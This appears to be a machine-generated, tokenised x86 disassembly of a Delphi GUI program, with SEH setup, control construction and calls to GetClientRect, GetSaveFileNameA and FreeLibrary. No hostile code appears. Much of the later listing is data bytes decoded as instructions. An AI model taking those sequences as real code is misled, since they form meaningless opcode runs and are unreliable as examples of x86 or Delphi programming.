mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_443c54
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
test bl bl
jne r-xdata
mov edx [ esi + 0x6c ]
mov eax [ ebp - 0x4 ]
call sub_46b684
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46b55c
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax [ esi + 0x5c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ esi + 0x80 ] 0x0
jl r-xdata
mov ebx esi
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_44f260
cmp eax [ ebx + 0x80 ]
jle r-xdata
push ebp
mov eax esi
mov edx [ eax + 0x80 ]
mov eax [ eax + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_46b95c
pop ecx
sub_46bed9
clc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46bf4b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_46bf13
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44a064
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bf52
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
sub_46bf18
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406660
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_441d94
call sub_403f08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bf52
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
sub_46bf5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_46c211
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_439750
lea edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_42852c
mov edx [ ebp - 0x8 ]
lea eax [ esi + 0x60 ]
call sub_404480
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43753c
mov ebx eax
mov [ esi + 0xb8 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_441d94
push 0xa9
push 0xc8
mov ecx 0x5
mov edx 0xcc
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
xor edx edx
mov eax ebx
call sub_437948
mov edx 0x6
mov eax ebx
call sub_437980
mov dx 0x1
mov eax ebx
call sub_4486a0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_431414
mov ebx eax
mov [ esi + 0xbc ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_441d94
push 0x9d
push 0x17
mov ecx 0x6
mov edx 0x6
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
mov dl 0x1
mov eax ebx
call sub_441278
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_46af78
mov ebx eax
mov [ esi + 0xc0 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push 0x17
push 0x16
mov ecx 0x1
mov edx 0x4d
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
call sub_46b55c
mov ecx r-xdata
mov edx [ rw-data ]
call sub_427164
lea edx [ ebx + 0x80 ]
mov eax [ rw-data ]
call sub_406660
xor edx edx
mov eax ebx
call sub_441ed8
mov dl 0x1
mov eax ebx
call sub_441eb4
mov [ ebx + 0x124 ] esi
mov eax [ esi ]
mov eax [ eax + 0x44 ]
mov [ ebx + 0x120 ] eax
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43753c
mov ebx eax
mov [ esi + 0xc4 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_441d94
push 0x9d
push 0x91
mov ecx 0x1d
mov edx 0x6
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
mov dl 0x5
mov eax ebx
call sub_441278
mov dl 0x2
mov eax ebx
call sub_43792c
mov dl 0x1
mov eax ebx
call sub_437948
xor edx edx
mov eax ebx
call sub_4486a0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_436954
mov [ esi + 0xc8 ] eax
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ebx [ esi + 0xc8 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x5
mov eax ebx
call sub_441278
mov [ ebx + 0x12c ] esi
mov eax [ esi ]
mov eax [ eax + 0x44 ]
mov [ ebx + 0x128 ] eax
mov edx [ esi + 0xc4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax ebx
call sub_436d80
mov dl 0x1
mov eax ebx
call sub_436d50
mov dl 0x1
mov eax ebx
call sub_436d28
mov [ ebx + 0x17a ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c218
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
add esp 0xfffffff0
call sub_403a24
sub_46c218
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_46c419
xor ebx ebx
call sub_403f08
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_439950
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c4b7
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_404450
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404450
retn
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_406660
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xbc ]
call sub_441d94
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc0 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
xor edx edx
call sub_436d40
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_406660
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc4 ]
call sub_441d94
sub_46c4d4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
xor edx edx
mov [ ebp - 0x34 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46c5ac
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebx + 0x3c ]
push eax
call GetClientRect
lea edx [ ebp - 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
sub edx eax
add edx eax
mov [ ebp - 0x10 ] edx
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0xb8 ]
call sub_441724
lea edx [ ebp - 0x30 ]
mov eax [ ebx + 0xc4 ]
call sub_441704
mov edx [ ebp - 0x28 ]
mov eax [ ebx + 0xc0 ]
sub edx [ eax + 0x48 ]
sub edx 0x2
mov eax [ ebx + 0xc0 ]
call sub_4414d4
xor edx edx
mov eax [ ebx + 0xc8 ]
call sub_436d40
lea eax [ ebx + 0xcc ]
call sub_40442c
lea edx [ ebp - 0x34 ]
mov eax [ rw-data ]
call sub_406660
mov edx [ ebp - 0x34 ]
mov eax [ ebx + 0xc4 ]
call sub_441d94
mov edx [ ebx + 0x3c ]
mov eax [ ebx + 0xb8 ]
call sub_445c54
mov eax ebx
call sub_4396b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c5b3
lea eax [ ebp - 0x34 ]
call sub_40442c
retn
sub_46c5ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi eax
xor eax eax
push ebp
push sub_46c853
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45a808
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46c836
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45b640
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406660
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_441d94
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_45bef4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x22d ] 0x1
mov dl 0x4
mov eax [ ebp - 0x4 ]
call sub_45c554
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1e4 ] edi
mov [ eax + 0x1e0 ] r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43753c
mov ebx eax
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_441d94
mov dl 0x5
mov eax ebx
call sub_441278
xor edx edx
mov eax ebx
call sub_437948
mov dl 0x1
mov eax ebx
call sub_43799c
mov edx 0x5
mov eax ebx
call sub_437980
mov edx 0x80000005
mov eax ebx
call sub_441f04
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov [ ebx + 0x1f8 ] 0x1
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_436954
mov esi eax
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x5
mov eax esi
call sub_441278
mov dl 0x1
mov eax esi
call sub_436d50
mov dl 0x1
mov eax esi
call sub_436d80
mov dl 0x1
mov eax esi
call sub_436d28
mov eax [ edi + 0xc8 ]
mov edx [ eax + 0x168 ]
mov eax [ esi + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_424c7c
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c83d
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
mov eax [ ebp - 0x4 ]
call sub_441768
mov esi eax
mov eax ebx
call sub_441768
sub esi eax
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_424c7c
add esi eax
add esi 0xa
push esi
mov eax [ ebp - 0x4 ]
call sub_45c0c4
call sub_45f7c4
lea eax [ eax + eax * 2 ]
test eax eax
jns r-xdata
sar eax 0x2
pop edx
call sub_428b74
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45b5e0
mov eax [ ebp - 0x4 ]
call sub_4417ac
mov esi eax
mov eax ebx
call sub_4417ac
sub esi eax
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_424c94
add esi eax
add esi 0xa
push esi
mov eax [ ebp - 0x4 ]
call sub_45c0c4
call sub_45f790
lea eax [ eax + eax * 2 ]
test eax eax
jns r-xdata
add eax 0x3
sar eax 0x2
pop edx
call sub_428b74
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45b610
add eax 0x3
sub_46c8a8
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x44 ] eax
test [ ebx + 0x5e ] 0x1
jne r-xdata
mov eax r-xdata
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx GetSaveFileNameA
mov eax ebx
call sub_439a80
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_46c8ec
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46c937
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_42852c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x60 ]
call sub_404828
sete al
xor al 0x1
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c93e
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_46c944
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46c969
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c970
retn
sub_46c98b
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46c9d0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c9d7
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404f0c
sub_46c9f3
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46ca38
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ca3f
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404f0c
sub_46ca4f
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46caa5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46caac
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_40442c
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_46cab8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46cadd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cae4
retn
sub_46cb02
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x35 ] bh
inc esi
add [ eax + eax ] bl
add [ eax ] al
and al 0x3c
inc ecx
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ esi + ebp * 2 ] dl
inc ecx
add [ eax + 0x6b ] ch
inc ecx
add [ eax + 0x6b ] dh
inc ecx
add ah al
xlat
inc esi
add [ eax + 0x600046d8 ] bl
outsd
inc ecx
add [ eax - 0x77ffbe91 ] dl
outsd
inc ecx
add [ eax + ebx * 8 + 0x46 ] bl
add ah al
fadd [ esi ]
loopne r-xdata
inc esi
add ah ch
fadd [ esi ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] ch
add [ eax ] al
adc [ esp + ecx * 2 + 0x69 ] dl
jae r-xdata
or cl [ ecx + 0x6d ]
inc ebx
outsd
outsb
je r-xdata
pop es
adc [ esp + ecx * 2 + 0x69 ] dl
jae r-xdata
add al 0xcc
inc esi
add [ ebx ] al
adc dl [ esp + ecx * 2 + 0x69 ]
jae r-xdata
popad
dec ecx
outsb
js r-xdata
outsd
insb
dec ecx
je r-xdata
dec ecx
je r-xdata
inc ebx
outsd
outsb
je r-xdata
dec ecx
je r-xdata
insd
nop
nop

outsb
je r-xdata
insd
outsd
insb
dec ecx
je r-xdata
add [ ecx + edi ] dl
insd
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
adc al 0x39
outsd
insb
dec ecx
je r-xdata
add ecx [ eax ]
add al 0x4c
imul esi [ ebx + 0x74 ] 0x694c5411
jae r-xdata
outsd
jb r-xdata
jae r-xdata
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
insd
cmp al 0xcb
inc esi
add [ eax + 0x200413c ] dh
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
outsd
insb
dec ecx
je r-xdata
add [ esi * 2 + 0x75080041 ] al
inc ecx
add [ eax + esi * 2 ] cl
inc ecx
insb
dec ecx
je r-xdata
mov al 0x3d
inc ecx
add [ eax ] cl
insd
jae r-xdata
cmp [ eax ] eax
inc ebx
outsd
jae r-xdata
push esp
jns r-xdata
adc [ eax ] al
adc [ eax ] al
add bh bh
and [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
pop es
inc ebx
popad
jo r-xdata
add [ eax + edx + 0x100040 ] ch
inc esi
add [ eax ] ah
add [ eax ] al
insd
jae r-xdata
jae r-xdata
add [ eax + 0x71 ] bh
inc ecx
add [ ecx + ebx * 8 + 0x46 ] ah
add [ ecx ] dl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
inc eax
add [ esi + esi + 0x40 ] dh
insd
or [ 0x6d657449 ] al
xor dl [ eax ]
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
dec esp
xor [ eax ] edx
push esp
add eax 0x6d657449
inc eax
inc ebx
outsd
outsb
je r-xdata
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
int3
nop
imul ebp [ edi + 0x6e ] r-xdata
sbb [ eax ] al
add bh bh
sub [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add [ eax ] eax
inc ecx
add [ ebx ] al
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
int 0x46
add [ eax + 0x3e ] al
inc ecx
jb r-xdata
inc ecx
arpl [ esi + ebp * 2 + 0x73 ] si
add eax [ eax ]
add [ eax ] dl
add [ eax - 0x80000000 ] al
add [ eax ] eax
or [ ebx + 0x6f ] dl
insb
dec ecx
je r-xdata
add [ eax ] cl
jne r-xdata
insb
dec ecx
je r-xdata
jo r-xdata
outsd
inc eax
add [ eax + eax ] bl
add bh bh
sbb al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
or eax 0x65736143
push ebx
outsb
jae r-xdata
add [ eax ] al
adc [ eax ] al
sbb al 0x0
jb r-xdata
in al 0xcd
inc esi
add [ eax ] cl
adc dl [ edi + eax * 2 + 0x65 ]
je r-xdata
outsb
je r-xdata
je r-xdata
push esp
jns r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
insd
jae r-xdata
add [ esp + esi * 2 + 0x74c00041 ] bh
inc ecx
add ah bh
jo r-xdata
jne r-xdata
insd
pop es
dec ecx
outsb
je r-xdata
dec eax
int 0x46
add [ eax + 0x6b ] ch
inc ecx
add [ eax + 0x6b ] dh
inc ecx
add [ eax + esi * 2 + 0x41 ] ah
add [ eax ] al
or [ edi ] al
inc ebx
push esp
inc ebx
jne r-xdata
je r-xdata
je r-xdata
add [ 0x6e756f43 ] eax
je r-xdata
push esp
inc ebx
jne r-xdata
jb r-xdata
jbe r-xdata
add [ ecx + ebx * 8 + 0x44 ] dl
add [ ecx + ebp * 8 ] dl
inc ecx
insd
dec ecx
dec esp
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ch cl
inc esi
add [ edi ] al
adc [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
ror [ eax - 0x33 ] 0x46
jb r-xdata
jmp [ eax ]
inc ebx
outsd
outsb
je r-xdata
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
out 0x44 eax
outsd
inc ecx
add [ edx + ebp * 2 - 0x2393ffbf ] al
inc esi
add [ eax - 0x15 ] dh
inc ecx
add [ ebx + ebx * 8 - 0x187fffbc ] bl
inc esp
je r-xdata
add [ ecx + edi ] dl
inc eax
jbe r-xdata
inc ebp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
insd
inc ebx
outsd
jne r-xdata
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
inc ebp
nop
dec ecx
outsb
je r-xdata
add [ eax ] al
xor bh cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add ah cl
inc esi
add [ 0xffffffffa4ff0000 ] bl
fiadd [ esi ]
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ edx + 0x44 ] ah
add [ edx - 0x1ae3ffbc ] dh
outsb
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
add [ eax ] ch
add [ eax ] al
add [ eax + 0x800413d ] dh
inc eax
add [ ecx * 8 + 0x46 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
int 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
int 0x46
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or [ edi + 0x6e ] ecx
inc ebx
outsd
insd
jo r-xdata
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add al cl
fiadd [ esi ]
xor ah ch
inc ecx
add ah dl
jmp r-xdata
outsd
insb
mov eax eax
mov eax 0x46ce
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
iretd
sbb al 0xe5
outsb
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
insb
or [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
iretd
jb r-xdata
add [ eax ] al
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
jb r-xdata
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
mov eax 0x340046ce
fiadd [ eax + eax + 0x3 ]
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
add cl [ eax ]
inc esp
add [ eax ] bl
add [ eax ] al
[ eax ]
push eax
int3
push es
push ebx
outsb
jb r-xdata
je r-xdata
outsb
jbe r-xdata
jb r-xdata
push ebx
outsd
sub dh cl
inc esi
add [ eax ] cl
adc dl [ ecx + ecx * 2 + 0x74 ]
insd
inc eax
outsb
add [ bp + si ] ecx
dec ecx
insd
add [ ebp - 0x309fffc0 ] cl
inc esi
add [ eax ] cl
adc al 0x54
inc edi
je r-xdata
outsd
outsb
je r-xdata
outsb
je r-xdata
pop es
adc dl [ esi + edx * 2 + 0x69 ]
jb r-xdata
add [ esp + eax * 2 ] eax
dec ecx
outsb
je r-xdata
imul esi [ edx + 0x74 ] 0x496c6175
je r-xdata
jb r-xdata
add cl [ eax ]
push es
push ebx
outsb
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
call 0x7447125f
add [ eax ] al
dec [ eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] cl
dec eax
insb
jo r-xdata
jne r-xdata
add [ eax - 0x15 ] dh
inc ecx
add [ ebx + ebx * 8 - 0x187fffbc ] bl
inc esp
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add al cl
fiadd [ esi ]
xor ah ch
inc ecx
add ah dl
jmp r-xdata
inc ecx
add [ esp + ebx * 8 + 0x46 ] ch
add [ esi + esi + 0x40 ] dh
add [ edx + 0x44 ] ah
pop es
push eax
outsd
imul ebp [ esi + 0x74 ] 0x408d7265
add [ eax ] ah
add [ edx + ebp * 2 - 0x2393ffbf ] al
inc esi
in eax 0x41
jb r-xdata
rol [ esi ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
rol [ esi ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x46
insd
inc ebp
jbe r-xdata
jae r-xdata
outsd
outsb
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
push 0x0
add bh bh
enter 0x44e4 0x0
add [ eax ] eax
insb
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
and al dl
inc esi
add [ edi + ecx * 8 ] ch
inc esi
add [ ecx ] dl
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
popad
je r-xdata
inc esp
add al 0x44
add [ eax ] al
add [ esi + ecx * 8 + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x46d0 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x27ffb930 ] al
outsb
je r-xdata
inc esp
add [ eax ] al
adc [ eax ] al
enter 0x0 0xff
or al 0xde
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
js r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
lodsb [ gs : esi ]
adc [ eax ] al
add [ fs : eax ] al
jmp [ eax - 0x1d ]
add [ eax ] al
adc [ eax ] al
mov al [ 0xffffffffa0ff0000 ]
fadd [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x65530608
outsb
jb r-xdata
into
inc esi
add al al
add [ eax ] al
push ebx
push 0x4374726f
jne r-xdata
popad
jb r-xdata
adc dl [ ebx + 0x65 ]
arpl [ edi + 0x6e ] bp
xor al 0x41
add [ eax + eax - 0x19430100 ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
jl r-xdata
add al [ 0x65646e49 ]
js r-xdata
push esp
inc ebx
jne r-xdata
je r-xdata
insd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000f ] al
outsb
dec ecx
je r-xdata
rol [ eax ] 0x0
jae r-xdata
insd
loopne r-xdata
inc ebx
jne r-xdata
add bh bh
add dh ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
movsb [ edi ] [ esi ]
add [ eax ] al
jmp [ eax + 0x10046dd ]
add [ 0x756c6156 ] eax
dec ecx
outsb
je r-xdata
add [ ecx + ebp * 8 ] dl
inc ecx
fadd [ eax ]
add [ eax ] al
insb
into
inc esi
je r-xdata
or al 0x70
jb r-xdata
inc ecx
add [ eax + 0x6b ] ch
inc ecx
add [ eax + 0x6b ] dh
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
adc [ eax ] al
xchg [ eax ] al
add bh bh
and bh ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
